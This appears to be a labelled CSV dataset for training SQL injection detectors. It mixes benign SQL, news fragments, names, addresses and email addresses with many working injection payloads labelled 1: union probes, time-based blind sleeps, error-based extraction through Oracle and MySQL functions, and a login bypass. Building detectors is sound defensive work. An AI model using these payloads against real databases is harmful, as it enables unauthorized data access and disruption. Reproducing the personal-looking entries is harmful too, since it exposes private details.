Sentence,Label
" Israeli television broadcaster Channel 2 showed satellite images base Latakia , Russian S-125 Newa-type defence missiles battery SA-3 missiles could seen , according Channel 2 range 35 kilometres transport warheads weighing 70 kilograms ",0
navalperal de tormes,0
1'  )   order by 1#,1
torrent refojo,0
arrebatadizo,0
calbucura bansells,0
axman@culturalsanpedrocf.ie,0
SELECT AVG ( copy ) FROM slip SELECT SUM ( valley ) ,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  3770  =  3770",1
"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""owbp""  =  ""owbp",1
"1"" )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( ""hbfr"" like ""hbfr",1
or 1/*,1
prec3+s,0
SELECT * FROM where WHERE add NOT LIKE 'engine%',0
"1"" and 4595 = 4595#",1
"1""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
1%' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
"c/ bernat y baldovi, 32 6-g",0
g73no,0
SELECT * FROM person  WHERE feathers = solid,0
SELECT * FROM indeed ORDER BY regular DESC,0
SELECT stage ( s ) FROM guess INNER JOIN,0
 Kerr Bloom married since 2010 ,0
38182378d,0
" Instead , believes dogs learned experience moves &apos;t feel worried ",0
-7746'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'itxy' like 'itxy,1
1804467528403939,0
"   SELECT thy, think, paint FROM cast WHERE top  IS NULL",0
"select * from generate_series ( 3379,3379,case when  ( 3379 = 1219 )  then 1 else 0 end )  limit 1--",1
sincr5nica,0
"1%'   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
 I expecting see gnashing teeth fight breaking gate ,0
1'|| ( select 'bqhi' from dual where 7409 = 7409,1
1'  )  )   as dipp where 1714 = 1714,1
" This pointed Christian Ulbrich , Jones Lang LaSalle CEO Europe , Near East Africa , 9th &apos; Immobilientag &apos; (Property Day) organised Börsen Zeitung (stock exchange newspaper)",0
8187933615095972,0
SELECT help ( s )  FROM particular,0
fowler,0
SELECT * FROM careful FETCH FIRST 50 PERCENT ROWS ONLY,0
4698577318753037,0
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  (  '%' = '",1
"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",1
"-4705' where 2029  =  2029 union all select 2029,2029,2029#",1
3628286866594079,0
"1""  )  )   )  and sleep ( 5 )  and   (  (   ( ""bvgg"" = ""bvgg",1
"-5622"" where 7970  =  7970 union all select 7970,7970,7970,7970,7970--",1
"1"" and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and ""mbas"" = ""mbas",1
trujillo,0
palau ustrell,0
SELECT * FROM doubt WHERE shoe IN  ( SELECT information FROM position ) ,0
"  SELECT Orders.parallelrID, Employees.was, Employees.volume FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.toID ORDER BY Orders.burstID",0
""" or """"^""",1
917a327n9?do,0
rebollo fita,0
1' )  union all select null#,1
SELECT bowl ( s )  FROM piano,0
"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'tqvy' like 'tqvy",1
ca5r7211a,0
"rua picouto, 14,",0
1' where 6116  =  6116,1
"INSERT INTO product  ( instant, spent, pig )  VALUES  ( 'sick', 'plates', 'anybody' )  ",0
zimmerly,0
benifallet,0
-9456%'   )    )     )   order by 1#,1
" Thus , developing underlying technical protocols , attention given creating stable foundation interception-proof exchange mail ",0
4771,0
"1  )  )   and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (  5200 = 5200",1
"-8633"" or 5099 = 5974",1
1'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1
"1""   )    )    and 7533  =  7533 and    (    (   ""rnni"" like ""rnni",1
r3i8a83nt1,0
"1%""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""%""  =  """,1
6138,0
 and 1  =  0  )   union all,1
"1'+ ( select 'yzxc' where 5230 = 5230  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )    )  )  +'",1
 &quot; Arctic Monkeys postpone Glasgow gig due Alex Turner &apos;s illness Rock band Arctic Monkeys postponed gig Glasgow lead singer diagnosed laryngitis ,0
"1'  )  )   )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( 'ibrj' = 'ibrj",1
SELECT COUNT ( purpleID ) FROM why,0
" Few mean gifts may be, I actually am, need assurance assurance fellows secondary testimony",0
camp fein,0
1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'vwve' like 'vwve,1
micr6pil8,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ||'",1
admin' or '1'  =  '1'/*,1
"1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
SELECT * FROM pile 3 SELECT * FROM studied,0
"1%""   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT * FROM wolf 3,0
SELECT AVG ( forty ) FROM obtain,0
"-2013""   )    )    as kisy where 3802  =  3802 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1
" select * from users where id = 1 union select .1_,version (  )  -- 1",1
im$ponderable,0
" select * from users where id = '1' + @ @1 union select 1,version (  )  -- 1'",1
" More three hours hearing , Long repeatedly pressed Sebelius &quot; architect &quot; Affordable Care Act voluntarily forgone government-sponsored insurance purchase plan HealthCare",0
"1  )  )   )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and   (  (   ( 6583 = 6583",1
montan cigala,0
SELECT * FROM sum WHERE crack NOT BETWEEN 'pond' AND 'mountain',0
SELECT * FROM closely,0
" They made way hustle bustle New York streets , via Rockerfeller Center , Central Park , provided perfect opportunity rest Autumn sun ",0
"c/ el perellonet 5,",0
 Honor venerable us ephemeris,0
1'  )  )   as jbcd where 9078 = 9078 and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  --,1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,1
"  SELECT FIND_IN_SET ( ""a"", ""s,q,l"" ) ;",0
"1%""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""%""  =  """,1
SELECT COUNT ( we ) FROM balance,0
mohsen,0
"1'   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'swjk'  =  'swjk",1
karolefs,0
-1641'  )  )   or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (  'vgcb' like 'vgcb,1
seglar,0
"-4825%' )  union all select 6804,6804,6804,6804,6804,6804,6804--",1
3307,0
" His arrival greeted chants , &quot; The army people one hand , &quot; hundreds gathered university &apos;s main lecture room ",0
cavey.cox@directoriogratuito.ec,0
select  ( case when  ( 4568 = 4241 )  then 4568 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1
SELECT * FROM palace WHERE answer = 'caught' FETCH FIRST 3 ROWS ONLY,0
"glorieta farmaceutico perez jimenez 197,",0
17773,0
 Rainer Schulze expert comes Cologne underworld ,0
1'  )  )   )  and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (   ( 'snoa' = 'snoa,1
"-9684"" order by 1#",1
mauer,0
begin user_lock.sleep ( 5 ) ,1
1%'  )  )   and sleep ( 5 )  and   (  (  '%' = ',1
1' in boolean mode  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  #,1
minton.mauban@salaparis.cat,0
"1' where 9003  =  9003 and make_set  (  5868  =  8316,8316  )  --",1
nalia,0
"1 where 7051 = 7051 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
" select * from users where id = '1'<@.. union select 1,version (  )  -- 1'",1
" SELECT * FROM alone ORDER BY mind, two",0
teodora,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3#",1
"1%'  )  )   )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( '%' = '",1
1  )   where 1120  =  1120,1
"-8790' )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( 'nsze' like 'nsze",1
SELECT AVG ( gravity ) FROM fence SELECT SUM ( largest ) ,0
1364,0
 Critics Sen,0
"1""  )  )   and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  ""llgb"" like ""llgb",1
13630,0
"-1807'  )  )   union all select 9853,9853,9853,9853,9853,9853#",1
escarpelo,0
"-8999"" where 2821  =  2821 union all select 2821,2821,2821,2821,2821,2821,2821,2821#",1
SELECT * FROM receive FETCH FIRST 3 ROWS ONLY,0
"1""  )   where 4878  =  4878 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",1
SELECT * FROM spoken WHERE price = 'are' LIMIT 3,0
SELECT roof ( s ) FROM diameter INNER JOIN,0
aragon 24 12?a,0
SELECT * FROM again WHERE worth LIKE '%practice%',0
albertei6,0
archie,0
-7864 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  # twpw,1
"paratge ter, 33,",0
kumushalieva@hiperbarcelona.ly,0
"1%'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  '%'  =  '",1
"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""eslo"" like ""eslo",1
1'  )   where 8575  =  8575 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
"  SELECT ants AS pen, worse AS [aloud]  FROM sky",0
"-2460%"" )  or  ( 2660 = 5767 ) *5767 and  ( ""%"" = """,1
 The Hamburg Towers basketball project declining make application possible stand-in place ,0
01218498g,0
aimarsen@enla.gi,0
burgos,0
-6215'  )   or   (  8459  =  8459  )  *4906,1
SELECT next ( s )  FROM post UNION,0
" select * from users where id = '1' union select 1,banner from v$version where rownum = 1 -- 1'",1
"1""  )   where 9020  =  9020 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1
arcnida,0
"  SELECT knifeID AS ID, milk AS string FROM even",0
"1   )    )    union all select null,null,null--",1
45738,0
"-4248""   )    )    union all select 9450,9450,9450--",1
"-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#",1
 Königsfeld: Small team gives spirited performance The voluntary fire service bravely came main autumn test run spite lack personnel ,0
"-3649""  )  )   as eydu where 3220 = 3220 or elt ( 8705 = 1510,1510 ) --",1
yoon,0
"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",1
zanobia,0
1'||  (  select 'nwve' where 7721  =  7721,1
f36hu1a,0
"1%"" and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1""  )  )   )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( ""nrhz"" like ""nrhz",1
"1 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
1  )   or sleep  (  5  )   and   (  2211  =  2211,1
"c/ albaida, 165, 2-a",0
"-8186%' or elt ( 1032 = 1032,3623 )  and '%' = '",1
 Around 50 listeners enjoyed sounds Hammrich musicians ,0
m43a3u6,0
SELECT * FROM excellent FETCH FIRST 3 ROWS ONLY,0
laborin arancibia,0
"1'||  (  select 'wgte' from dual where 6316  =  6316 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",1
"1  )   as zmjm where 9125  =  9125 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1%'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  '%'  =  '",1
9270,0
SELECT COUNT ( DISTINCT light )  FROM weigh,0
SELECT memory ( s )  FROM powerful SELECT lying FROM money,0
mckearne,0
"-7236 or make_set  (  9618  =  6919,6919  )  ",1
"select * from generate_series ( 6414,6414,case when  ( 6414 = 6455 )  then 1 else 0 end )  limit 1--",1
"  SELECT Orders.hiddenrID, Employees.bone, Employees.safe FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.planID ORDER BY Orders.frequentlyID",0
1'  )  )   )  and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (   ( 'pehq' like 'pehq,1
SELECT * FROM between WHERE palace  BETWEEN 10 AND 20,0
0246690614310406,0
3714419514854077,0
5592414895500154,0
"-4346' )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
"1"" and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and ""ouix"" = ""ouix",1
seto,0
9625616287143216,0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,1
34708532z,0
SELECT TOP 3 * FROM each WHERE blind = 'ought' SELECT * FROM merely,0
vilassar de mar,0
"  SELECT Orders.tobaccorID, Employees.single, Employees.die FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.whoseID ORDER BY Orders.bottleID",0
callie,0
dan,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   '%'  =  '",1
"   SELECT COUNT ( interior ) , thirty FROM certain BY mathematics",0
"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'obax' like 'obax",1
"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""zvew"" like ""zvew",1
"1' )  and elt ( 4249 = 4249,7259 )  and  ( 'bxnn' = 'bxnn",1
"1"" )  as rnte where 6517 = 6517 and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
80920943c,0
padraic,0
cardona@interanuncios.mv,0
latella,0
SELECT TOP 3 * FROM begun WHERE future = 'way',0
alcahazar,0
select * from users where id  =  1. or 1  =  1 -- 1,1
"  SELECT corner,grandfather FROM whispered WHERE behavior = 'income' UNION SELECT slowly, frog FROM greatly",0
" SELECT * FROM having ORDER BY firm, dry",0
"calle nuestra seora del portal s/n,",0
"1""  )  )   )  union all select null,null,null,null,null,null,null,null--",1
"1""  )  )   as qgwq where 6122 = 6122",1
"1%"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""%""  =  """,1
llaguno,0
" &quot; Unless player comes forward expresses desire leave club , &quot; explained Rangnick ",0
alcoholado sabaters,0
 DDoS attacks designed flood target website traffic servers overloaded site collapses ,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""yzjl"" like ""yzjl",1
1' )  as jdmh where 6175 = 6175 rlike sleep ( 5 ) #,1
8045890000000000,0
"1""  )  )   )  union all select null,null,null,null--",1
1'||  (  select 'wszt' from dual where 6854  =  6854 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  ||',1
" SELECT column_name ( s )  FROM pleasant,farm",0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367537 ) ,0
"1 )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
